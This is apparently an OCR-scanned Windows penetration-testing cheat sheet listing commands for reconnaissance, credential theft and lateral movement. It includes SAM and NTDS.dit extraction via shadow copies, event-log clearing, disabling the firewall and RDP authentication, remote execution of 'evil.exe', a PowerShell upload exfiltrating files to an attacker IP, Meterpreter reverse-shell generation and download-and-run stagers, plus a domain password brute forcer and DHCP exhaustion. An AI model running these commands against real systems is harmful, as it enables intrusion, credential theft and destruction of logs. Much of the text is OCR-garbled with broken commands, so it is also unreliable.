---
layout: default
---

# WINDOWS

## WINDOWS versions

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>ID</b>
      </th>
      <th style="text-align:left"><b>Version</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">NT 3.1</td>
      <td style="text-align:left">Windows NT 3.1 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 3.5</td>
      <td style="text-align:left">Windows NT 3.5 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 3.51</td>
      <td style="text-align:left">Windows NT 3.51 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 4.0</td>
      <td style="text-align:left">Windows NT 4.0 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 5.0</td>
      <td style="text-align:left">Windows 2000 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 5.1</td>
      <td style="text-align:left">Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 5.2</td>
      <td style="text-align:left">
        <p>Windows XP (64-bit, Pro 64-bit) Windows Server 2003 &amp; R2 (Standard,
          Enterprise)</p>
        <p>Windows Home Server</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">NT 6.0</td>
      <td style="text-align:left">Windows Vista (Starter, Home, Basic, Home Premium, Business, Enterprise,
        Ultimate)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 6.1</td>
      <td style="text-align:left">Windows 7 (Starter, Home, Pro, Enterprise, Ultimate) Windows Server 2008
        R2 (Foundation, Standard, Enterprise)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 6.2</td>
      <td style="text-align:left">Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM)) Windows Phone 8
        Windows Server 2012 (Foundation, Essentials, Standard)</td>
    </tr>
  </tbody>
</table>## WINDOWS files

| **Command** | **Description** |
| :--- | :--- |
| %SYSTEMROOT% | Typically C:\Windows |
| %SYSTEMROOT%\System32\drivers\etc\hosts | DNS entries |
| %SYSTEMROOT%\System32\drivers\etc\networks | Network settings |
| %SYSTEMROOT%  system32  config\SAM | User & password hashes |
| %SYSTEMROOT%\repair\SAM | Backup copy of SAM |
| %SYSTEMROOT%\System32\config\RegBack\SAM | Backup copy of SAM |
| %WINDIR%\system32\config\AppEvent.Evt | Application Log |
| %WINDIR%\system32\config\SecEvent.Evt | Security Log |
| %ALLUSERSPROFILE%\Start Menu\Programs\Startup\ | Startup Location |
| %USERPROFILE%\Start Menu\Programs\Startup\ | Startup Location |
| %SYSTEMROOT%\Prefetch | Prefetch dir \(EXE logs\) |

## Startup Directories

### WINDOWS NT 6.1,6.0

```text
# All users
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 
# Specific users
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
```

### WINDOWS NT 5.2, 5.1, 5.0

```text
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup
```

### WINDOWS 9x

```text
%SystemDrive%\wmiOWS\Start Menu\Programs\Startup
```

### WINDOWS NT 4. 0, 3. 51, 3. 50

```text
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup
```

## WINDOWS system info commands



| **Command** | **Description** |
| :--- | :--- |
| ver | Get OS version |
| sc query state=all | Show services |
| tasklist /svc | Show processes & services |
| tasklist /m | Show all processes & DLLs |
| tasklist /S ip /v | Remote process listing |
| taskkill /PID pid /F | Force process to terminate |
| systeminfo /S ip /U domain\user /P Pwd | Remote system info |
| reg query \\ ip \ RegDomain \  Key /v VALUE | Query remote registry, /s=all values |
| reg query HKLM /f password /t REG\_SZ /s | Search registry for password |
| fsutil fsinfo drives | List drives •must be admin |
| dir /a /s /b c:\'.pdf' | Search for all PDFs |
| dir /a /b c:\windows\kb' | Search for patches |
| findstr /si password' .txt I •.xmll •.xls | Search files for password |
| tree /F /A c: tree.txt | Directory listing of C: |
| reg save HKLM\Security security.hive | Save security hive to file |
| echo %USERNAME% | Current user |

## WINDOWS net/domain commands



<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">net view /domain</td>
      <td style="text-align:left">Hosts in current domain</td>
    </tr>
    <tr>
      <td style="text-align:left">net view /domain: [MYDOMAIN]</td>
      <td style="text-align:left">Hosts in [MYDOMAIN]</td>
    </tr>
    <tr>
      <td style="text-align:left">net user /domain</td>
      <td style="text-align:left">All users in current domain</td>
    </tr>
    <tr>
      <td style="text-align:left">net user user pass /add</td>
      <td style="text-align:left">Add user</td>
    </tr>
    <tr>
      <td style="text-align:left">net localgroup &quot;Administrators&quot; user /add</td>
      <td style="text-align:left">Add user to Administrators</td>
    </tr>
    <tr>
      <td style="text-align:left">net accounts /domain</td>
      <td style="text-align:left">Domain password policy</td>
    </tr>
    <tr>
      <td style="text-align:left">net localgroup &quot;Administrators&quot;</td>
      <td style="text-align:left">List local Admins</td>
    </tr>
    <tr>
      <td style="text-align:left">net group /domain</td>
      <td style="text-align:left">List domain groups</td>
    </tr>
    <tr>
      <td style="text-align:left">net group &quot;Domain Admins&quot; /domain</td>
      <td style="text-align:left">List users in Domain Admins</td>
    </tr>
    <tr>
      <td style="text-align:left">net group &quot;Domain Controllers&quot; /domain</td>
      <td style="text-align:left">List DCs for current domain</td>
    </tr>
    <tr>
      <td style="text-align:left">net share</td>
      <td style="text-align:left">Current SMB shares</td>
    </tr>
    <tr>
      <td style="text-align:left">net session I find I &quot;\&quot;</td>
      <td style="text-align:left">Active SHB sessions</td>
    </tr>
    <tr>
      <td style="text-align:left">net user user /ACTIVE:yes /domain</td>
      <td style="text-align:left">Unlock domain user account</td>
    </tr>
    <tr>
      <td style="text-align:left">net user user &apos;&apos; newpassword &apos;&apos; /domain</td>
      <td style="text-align:left">Change domain user password</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>net share share c:\share</p>
        <p>/GRANT:Everyone,FULL</p>
      </td>
      <td style="text-align:left">Share folder</td>
    </tr>
  </tbody>
</table>## WINDOWS remote commands

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">tasklist /S ip /v</td>
      <td style="text-align:left">Remote process listing</td>
    </tr>
    <tr>
      <td style="text-align:left">systeminfo /S ip /U domain\user /P Pwd</td>
      <td style="text-align:left">Remote systeminfo</td>
    </tr>
    <tr>
      <td style="text-align:left">net share \\ ip</td>
      <td style="text-align:left">Shares of remote computer</td>
    </tr>
    <tr>
      <td style="text-align:left">net use \\ ip</td>
      <td style="text-align:left">Remote filesystem (IPC$)</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>net use z: \\ ip \share password</p>
        <p>/user: DOMAIN user</p>
      </td>
      <td style="text-align:left">
        <p>Map drive, specified</p>
        <p>credentials</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">reg add \\ ip \ regkey \ value</td>
      <td style="text-align:left">Add registry key remotely</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>sc \\ ip create service</p>
        <p>binpath=C:\Windows\System32\x.exe start= auto</p>
      </td>
      <td style="text-align:left">
        <p>Create a remote service</p>
        <p>(space after start=)</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">xcopy /s \\ ip \dir C:\local</td>
      <td style="text-align:left">Copy remote folder</td>
    </tr>
    <tr>
      <td style="text-align:left">shutdown /m \\ ip /r /t 0 /f</td>
      <td style="text-align:left">Remotely reboot machine</td>
    </tr>
  </tbody>
</table>## WINDOWS network commands

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">ipconfig I all</td>
      <td style="text-align:left">IP configuration</td>
    </tr>
    <tr>
      <td style="text-align:left">ipconfig /displaydns</td>
      <td style="text-align:left">Local DNS cache</td>
    </tr>
    <tr>
      <td style="text-align:left">netstat -ana</td>
      <td style="text-align:left">Open connections</td>
    </tr>
    <tr>
      <td style="text-align:left">netstat -anop tcp 1</td>
      <td style="text-align:left">Netstat loop</td>
    </tr>
    <tr>
      <td style="text-align:left">netstat -ani findstr LISTENING</td>
      <td style="text-align:left">LISTENING ports</td>
    </tr>
    <tr>
      <td style="text-align:left">route print</td>
      <td style="text-align:left">Routing table</td>
    </tr>
    <tr>
      <td style="text-align:left">arp -a</td>
      <td style="text-align:left">Known MACs (ARP table)</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>nslookup, set type=any, ls -d domain</p>
        <p>results.txt, exit</p>
      </td>
      <td style="text-align:left">DNS Zone Xfer</td>
    </tr>
    <tr>
      <td style="text-align:left">nslookup -type=SRV _www._tcp.url.com</td>
      <td style="text-align:left">Domain SRV lookup ( ldap, kerberos, sip)</td>
    </tr>
    <tr>
      <td style="text-align:left">tftp -I ip GET remotefile</td>
      <td style="text-align:left">TFTP file transfer</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh wlan show profiles</td>
      <td style="text-align:left">Saved wireless profiles</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh firewall set opmode disable</td>
      <td style="text-align:left">Disable firewall (&apos;Old)</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh wlan export profile folder=. key=clear</td>
      <td style="text-align:left">Export wifi plaintext pwd</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh interface ip show interfaces</td>
      <td style="text-align:left">List interface IDs/MTUs</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>netsh interface ip set address local static</p>
        <p>ip nmask gw ID</p>
      </td>
      <td style="text-align:left">Set IP</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh interface ip set dns local static ip</td>
      <td style="text-align:left">Set DNS server</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh interface ip set address local dhcp</td>
      <td style="text-align:left">Set interface to use DHCP</td>
    </tr>
  </tbody>
</table>## WINDOWS utility commands



<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">type file</td>
      <td style="text-align:left">Display file contents</td>
    </tr>
    <tr>
      <td style="text-align:left">del path \&apos; .&#x2022; /a /s /q /f</td>
      <td style="text-align:left">Forceably delete all files in path</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>find /I &apos;&apos;str&apos;&apos; filename</p>
        <p>command I find /c /v &quot;&quot;</p>
      </td>
      <td style="text-align:left">Line count of cmd output</td>
    </tr>
    <tr>
      <td style="text-align:left">at HH:MM file [args] (i.e. at 14:45 cmd /c)</td>
      <td style="text-align:left">Schedule file to run</td>
    </tr>
    <tr>
      <td style="text-align:left">runas /user: user &quot; file [args]&quot;</td>
      <td style="text-align:left">Run file as user</td>
    </tr>
    <tr>
      <td style="text-align:left">restart /r /t 0</td>
      <td style="text-align:left">Restart now</td>
    </tr>
    <tr>
      <td style="text-align:left">tr -d &apos;\15\32&apos; win.txt unix.txt</td>
      <td style="text-align:left">Removes CR &amp; &apos;Z (&apos;nix)</td>
    </tr>
    <tr>
      <td style="text-align:left">makecab file</td>
      <td style="text-align:left">Native compression</td>
    </tr>
    <tr>
      <td style="text-align:left">Wusa.exe /uninstall /kb: ###</td>
      <td style="text-align:left">Uninstall patch</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>cmd.exe &quot;wevtutil qe Application /c:40</p>
        <p>/f:text /rd:true&quot;</p>
      </td>
      <td style="text-align:left">CLI Event Viewer</td>
    </tr>
    <tr>
      <td style="text-align:left">lusrrngr.msc</td>
      <td style="text-align:left">Local user manager</td>
    </tr>
    <tr>
      <td style="text-align:left">services.msc</td>
      <td style="text-align:left">Services control panel</td>
    </tr>
    <tr>
      <td style="text-align:left">taskmgr.exe</td>
      <td style="text-align:left">Task manager</td>
    </tr>
    <tr>
      <td style="text-align:left">secpool.rnsc</td>
      <td style="text-align:left">Security policy manager</td>
    </tr>
    <tr>
      <td style="text-align:left">eventvwr.rnsc</td>
      <td style="text-align:left">Event viewer</td>
    </tr>
  </tbody>
</table>## MISC. commands

### Lock workstation

```text
rundll32.dll user32.dll LockWorkstation 
```

### Disable windows firewall

```text
netsh advfirewall set currentprofile state off netsh advfirewall set allprofiles state off 
```

### Native windows port forward \(\* must be admin\)

```text
netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2 
#Remove
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=l.l.l.l 
```

### Re-enable command prompt

```text
reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /t REG DWORD /d 0 /f 
```

## PSEXEC

### Execute file hosted on remote system with specified credentials

```text
psexec /accepteula \\ targetiP -u domain\user -p password -c -f \\ smbiP \share\file.exe 
```

### Run remote command with specified hash

```text
psexec /accepteula \\ ip -u Domain\user -p Lt1 c:\Progra-1 
```

### Run remote command as system

```text
psexec /accepteula \\ ip -s cmd.exe 
```

## Terminal services \(RDP\)

### Start RDP

```text
Create regfile.reg file with following line in it: HKEY LOCAL t1ACHINE\SYSTEH\CurrentControlSet \Control\ TerminalService 
"fDenyTSCo~nections"=dword: 00000000
reg import reg file. reg 
net start ''terrnservice'' 
sc config terrnservice start= auto 
net start terrnservice 

    --OR--
reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control \Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Tunnel RDP out port 443 \(may need to restart terminal services\)

```text
REG ADD "HKLt1\System\CurrentControlSet\Control \Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f 
```

### Disable network level authentication, add firewall exception

```text
reg add "HKEY LOCAL t1ACHINE\SYSTEt1\CurentControlSet\Control \Terminal
Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f 

netsh firewall set service type = remotedesktop mode = enable 
```

### Import a schedule task from an "exported task" XML

```text
schtasks.exe /create /tn t1yTask /xml "C:\MyTask.xml" /f
```

## WMIC

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">wmic [alias] get /?</td>
      <td style="text-align:left">List all attributes</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic [alias] call /?</td>
      <td style="text-align:left">Callable methods</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic process list full</td>
      <td style="text-align:left">Process attributes</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic startupwmic service</td>
      <td style="text-align:left">Starts wmic service</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic ntdomain list</td>
      <td style="text-align:left">Domain and DC info</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic qfe</td>
      <td style="text-align:left">List all patches</td>
    </tr>
    <tr>
      <td style="text-align:left">wrnic process call create &quot;process_name&quot;</td>
      <td style="text-align:left">Execute process</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>wmic process where name=&quot;process&quot; call</p>
        <p>terminate</p>
      </td>
      <td style="text-align:left">Terminate process</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic logicaldisk get description,name</td>
      <td style="text-align:left">View logical shares</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic cpu get DataWidth /format:list</td>
      <td style="text-align:left">Display 32 I I 64 bit</td>
    </tr>
  </tbody>
</table>### WMIC \[alias\] \[where\] \[clause\]

```text
[alias] == process, share, startup, service, nicconfig, useraccount, etc. 
[where] ==where (name="cmd.exe"), where (parentprocessid!=[pid]"), etc. 
[clause] ==list [fulllbrief], get [attribl, attrib2], call [method], delete
```

### Execute file hosted over smb on remote system with specified credentials

```text
wmic /node: targetiP /user:domain\user /password:password process call create "\ \ smbiP \share\evil.exe" 
```

### Uninstall software

```text
wmic product get name /value # Get software names 
wmic product where name="XXX" call uninstall /nointeractive 
```

### Remotely determine logged in user

```text
wmic /node:remotecomputer computersystern get username 
```

### Remotely process listing every second

```text
wmic /node:machinename process list brief /every:l 
```

### Remotely start RDP

```text
wmic /node:"machinename 4" path Win32_TerminalServiceSetting where 
AllowTSConnections=''O'' call SetAllowTSConnections ''1''
```

### List number of times user has logged on

```text
wmic netlogin where (name like "%adm%") get numberoflogons 
```

### Search for services with unquoted paths on binary

```text
wmic service get narne,displayname,pathnarne,startrnode 
| findstr /i nauton | findstr /i /v "C:\windows\\" | findstr /i /v """
```

### Volume shadow copy

```text
1. wmic /node: DC IP /user:"DOI1AIN\user" /password:"PASS" process 
   call create "cmd /c vssadmin list shadows 2 &1 
   c:\temp\output.txt" 
# If any copies alread1 ex~st then exfil, otherwise create using 
following commands. Check output.txt for anJ errors 
2. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process 
   call create "cmd /c vssadmin create shadow /for=C: 2 &1 
   C:\temp\output.txt" 
3. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process 
   call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVol~meShadowCopy1\Windows\System32\co nfig\SYSTEM 
   C:\temp\system.hive 2 &1  
   C:\temp\output.txt" 
4. wmic /node: DC IP /user: "DOl'.llUN\user" /password: "PASS" process call create ''cmd /c copy 
   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyc\NTDS\NTDS.dit 
   C:\temp\ntds.dit 2 &1 C:\temp\output.txt" 
Step by step instructions on room362.com for step below 
5. From Linux, download and run ntdsxtract and libesedb to export 
   hashes or other domain information 
   a. Additional instructions found under the VSSOWN section 
   b. ntdsxtract - http://www.ntdsxtract.com 
   c. libesedb - http://code.google.com/p/libesedb/ 
```

## POWERSHELL

| **Command** | **Description** |
| :--- | :--- |
| stop-transcript | stop recording |
| get-content file | displays file contents |
| get-help command -examples | Shows examples of command |
| get-command  'string' | Searches for cmd string |
| get-service | Displajs services \(stopservice, start-service\) |
| get-wmiobject -class win32 service | Displays services, but takes alternate credentials |
| $PSVesionTable | DisplaJ powershell version |
| powershell.exe -version 2.0 | Run powershell 2.0 from 3.0 |
| get-service measure-object | Returns \# of services |
| get-psdrive | Returns list of PSDrives |
| get-process select -expandproperty name | Returns only names |
| get-help ' -parameter credential | Cmdlets that take creds |
| get-wmiobject -list -'network' | Available WMI network cmds |
| \(Net.DNS\]: :GetnostEntry\(" ip "I | DNS Lookup |

### Clear security & application event log for remote server\(SVR01\)

```text
Get-EventLog -list 
Clear-EventLog -logname Application, Security -computername SVR01 
```

### Export OS info into CSV file

```text
Get-WmiObject -class win32 operatingsystem | select -property ' | 
export-csv c:\os.txt
```

### List running services

```text
Get-Service | where_object {$_.status -eq "Running"} 
```

### Persistent psdrive to remote file share

```text
New-PSJrive -Persist -PSProvider FileSjstem -Root \\1.1.1.1\tools -Name i 
```

### Return files with write data past 8/20

```text
Get-Childitem -Path c:\ -Force -Rec~rse -Filter '.log -ErrorAction
SilentlyContinue | where {$_.LastWriteTime -gt "2012-08-20"} 
```

### File download over http

```text
(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'') 
```

### TCP port connection\(scanner\)

```text
$ports=(#,#,#) ;$ip="x.x.x.x";foreach ($port in $ports) {try
($socket=New-bject Sjstem.Net.Sockets.TCPClient($ip,$port); }catch(};
if ($socket -eq $NULL) (echo $ip":"$port"- Closed";}
else(echo $ip":"$port"- Open";$socket =$NULL;}}
```

### Ping with 500 millisecond timeout

```text
$ping = New-Object Sjstex.Net.Networkinformation.ping 
$ping.Send('' ip '',5JO) 
```

### Basic authentication popup

```text
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass 
$Host.UI.PromptForCredential(" title "," message "," user" "," domain") 
```

### Run exe every 4 hours between aug 8-11, 2013 and the hours of 0800-1700 \(from cmd.exe\)

```text
powershell. exe -Command "do {if ((Get-Date -format yyyyMMdd-HHmm) -match
'201308 ( 0 [ 8-9] |1 [0-1])-(0[ 8-9]]|1 [ 0-7]) [ 0-5] [ 0-9]') {Start-Process -
WindowStyle Hidden "C:\Temp\my.exe";Start-Sleep -s 14400))while(1)" 
```

### Powershell runas

```text
$pw ~ convertto-securestring -string "PASSWORD" -asplaintext -force;
$pp ~ new-object -typename System.Management.Automation.PSCredential - 
argument list "DOMAIN\user", $pw;
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command 
&{Start-Process file.exe -verb runas)' 
```

### Email sender

```text
powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject 
"Subject" -a " attachment file path " -body "Body" -SmtpServer Target
Email Server IP 
```

Turn on powershell remoting \(with valid credentials\)

```text
net time \\ip
at \\ip time "Powershell -Command 'Enable-PSRemoting -Force'"
at \\ip time+1 "Powershell -Command 'Set-Item
wsman:\localhost\client\trustedhosts ''"
at \ \ip time+2 "Powershell -Command 'Restart-Service WinRM'"
Enter-PSSession -ComputerName ip -Credential username 
```

List hostname and ip for all domain computers

```text
Get-WmiObject -ComputerName DC -Namespace root\microsoftDNS -Class 
MicrosoftDNS _ ResourceRecord -Filter "domainname~' DOMAIN '" | select 
textrepresentation 
```

Powershell download for a file from a specified location

```text
powershell.exe -noprofile -noninteractive -command 
"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback = 
{$true); $source="""https:ll YOUR SPECIFIED IP I file.zip """; 
$destination="C:\rnaster.zip"; $http = new-object Systern.Net.WebClient;
$response= $http.DownloadFile($source, $destination);" 
```

### Powershell data exfil

```text
Script will send a file ($filepath) via http to server ($server) via POST request. 
Must have web server listening on port designated in the $server
 
powershell.exe -noprofile -noninteractive -command 
"[S;stem.Net.ServicePointManager] ::ServerCertificateValidationCallback = 
{$true); $server="""http:// YOUR_SPECIFIED IP / folder """;
$filepath="C:\master.zip" $http= new=object System.Net.WebClient;
$response= $http.UploadFile($server,$filepath);" 
```

## Using powershell to launch meterpreter from memory

```text
Need Metasploit v4.5+ (msfvenom supports Powershell) 
Use Powershell (x86) with 32 bit Meterpreter payloads 
encodeMeterpreter.psl script can be found on next page 
```

### On attack boxes

```text
1. ./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=1.1.1.1 LPORT=443 audit.psl 
2. Move audit.psl into same folder as encodeMeterpreter.psl 
3. Launch Powershell (x86) 
4. powershell.exe -executionpolicy bypass encodeMeterpreter.psl 
5. Copy the encoded Meterpreter string
```

### Start listener on attack box

```text
1. ./msfconsole 
2. use exploit/multi/handler 
3. set payload windows/meterpreter/reverse https 
4. set LHOST 1. 1. 1. 1 
5. set LPORT 443 
6. exploit -j 
```

### On target \(muse use powershell\(x86\)\)

```text
1. powershell. exe -noexi t -encodedCommand paste encoded Meterpreter 
string here 
PROFIT 
```

### Encodemeterpreter.ps1 \[7\]

```text
# Get Contents of Script
$contents = Get-Content audit.psl
# Compress Script
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]: :Compress
$cs =New-Object IO.Compression.DeflateStream ($ms,$action)
$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding] ::ASCII)
$contents I ForEach-Object {$sw.WriteLine($ I)
$sw.Close()
# Base64 Encode Stream
$code= [Convert]: :ToBase64String($ms.ToArray())
$command= "Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object
IO. Compression. DeflateStream ('$(New-Object IO. t4emoryStream
(, '$ ( [Convert] : : FromBase64String ('"$code'") ) I I ,
[IO.Compression.Compressiont~ode]: :Decompress) I,
[Text.Encoding]: :ASCII)) .ReadToEnd() ;"
# Invoke-Expression $command
$bytes= [System.Text.Encoding] ::Unicode.GetBytes($command)
$encodedCommand = [Convert]: :ToBase64String($bytes)
# Write to Standard Out
Write-Host $encodedCommand
```

Copyright 2012 TrustedSec, LLC. All rights reserved.   
Please see reference \[7\] for disclaimer

## Using powershell to launch meterpreter \(2nd method\)

### On bt attack box

```text
1. msfpayload windows/rneterpreter/reverse tcp LHOST=10.1.1.1
LPORT~8080 R I msfencode -t psh -a x86
```

### On windows attack box

```text
1. c:\ powershell
2. PS c:\ $cmd = ' PASTE THE CONTENTS OF THE PSH SCRIPT HERE '
3. PS c:\ $u = [System.Text.Encoding]: :Unicode.GetBytes($crnd)
4. PS c: \ $e = [Convert] ::ToBase64String($u)
5. PS c:\ $e
6. Copy contents of $e
```

### Start listener on attack box

```text
1. ./msfconsole
2. use exploit/multi/handler
3. set payload windows/meterpreter/reverse tcp
4. set LHOST 1.1.1.1
5. set LPORT 8080
6. exploit -j
```

### On target shell \(1:download shellcode, 2:execute\)

```text
1.  c: \ powershell -noprofile -noninteracti ve -command " &
    {$client=new-object
    System.Net.WebClient;$client.DownloadFile('http://1.1.1.1/shell.txt
    ', 'c:\windows\temp\ shell.txt') )"
2.  c: \ powershell -noprofile -noninteracti ve -noexi t -command " &
    {$crnd~tjpe 'c:\windows\temp\ shell.txt';powershell -noprofilenoninteractive
    -noexit -encodedCornmand $cmd} "
PROFIT
```

## Windows registry

### Os information

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion
```

### Product name

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v
ProductNarne
```

### Data of install 

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate
```

### Registered owner

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner
```

### System boot

```text
HKLM\Software\~icrosoft\Windows NT\CurrentVersion /v SystemRoot
```

### Time zone \(offset in minutes from utc\)

```text
HKLM\System\CurrentControlSet\Control\TimeZoneinformation /v ActiveTirneBias
```

### Mapped network drivers

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive
MRU
```

### Mounted devices

```text
HKLM\System\MountedDevices
```

### USB devices

```text
HKLM\System\CurrentControlSet\Enurn\USBStor
```

### Turn on IP forwarding

```text
HKEY_LOCAL_~ACHI~E\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -
IPEnableRouter = 1
```

### Password keys: LSA secret cat certain vpn, autologon, other passwords

```text
HKEY LOCAL MACHINE\Security\Policy\Secrets
HKCU\Software \Microsoft \Windows NT\CurrentVersion \Winlogon \autoadminlogon
```

### Audit policy

```text
HKLM\Security\Policy\PolAdTev
```

### Kernel/user services

```text
HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services
```

### Installed software on machine 

```text
HKLM\Software
```

### Installed software for user

```text
HKCU\Software
```

### Recent document

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
```

### Recent user location

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisite
dtmu & \Opensavetmu
```

### Typed URLs

```text
HKCU\Software\Microsoft\Internet Explorer\TypedURLs
```

### MRU lists

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### Last registry key accessed 

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKeY
```

### Startup locations

```text
HKLM\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load & \Run
```

## Enumerating windows domain with dsquery

### List users on domain with no limit on results

```text
dsquery user -limit 0
```

### List groups for domain=victim.com

```text
dsquery group "cn=users, dc=victim, dc=com"
```

### List domain admin accounts

```text
dsquery group -name "domain admins" | dsget group -members -expand
```

### List all groups for a user

```text
dsquery user -name bob | dsget user -memberof -expand
```

### GET a user's login id

```text
dsquery user -name bob | dsget user -samid
```

### List accounts inactive for 2 weeks

```text
dsquery user -inactive 2
```

### Add domain user

```text
dsadd user "CN=Bob,CN=Users,DC=victim,DC=com" -samid bob -pwd bobpassdisplaj
"Bob" -pwdneverexpires yes -memberof "CN=Domain
Admins,CN=Users,DC=victim,DC=com
```

### Delete user

```text
dsrm -subtree -noprornpt "CN=Bob,CN=Users,DC=victim,DC=com"
```

### List all operating systems on domain

```text
dsquery A "DC=victim,DC=com" -scope subtree -attr "en" "operatingSystem"
"operatingSjstemServicePack" -filter
" (& (objectclass=computer) (objectcategory=computer) (operatingSystem=Windows}
))"
```

### List all site names

```text
dsquery site -o rdn -limit 0
```

### List all subnets within a site

```text
dsquery subnet -site sitename -o rdn
```

### List all services within a site

```text
dsquery server -site sitename -o rdn
```

### Find servers in the domain

```text
dsquery ' domainroot -filter
" (& (objectCategory=Computer) (objectClass=Computer) (operatingSystem='Server'
) ) " -limit 0
```

### Domain controller per site

```text
dsquery "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter
(objectCategory=Server)
```

## Windows scripting 

If scripting in batch file, variables must be preceeded with %%, i.e. %%i

### Nested for ping sweep

```text
for /L %i in (10,1,254) do@ (for /L %x in (10,1,254) do@ ping -n 1 -w 100
10.10.%i.%x 2 nul 1 find "Reply" && echo 10.10.%i.%x live.txt)
```

### loop through file

```text
for /F %i in ( file ) do command
```

### Domain brute forcer

```text
for /F %n in (names.txt) do for /F %pin (pawds.txt) do net use \\DC01\IPC$
/user: domain \%n %p 1 NUL 2 &1 && echo %n:%p && net use /delete
\\DCOl\IPC$ NUL
```

### Account lockout\(lockout.bat\)

```text
@echo Test run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN-
1234\c$ /USER:%%U wrongpass
```

### DHCP exhaustion

```text
for /L %i
1.1.1.%i
in (2,1,254) do (netsh interface ip set address local static
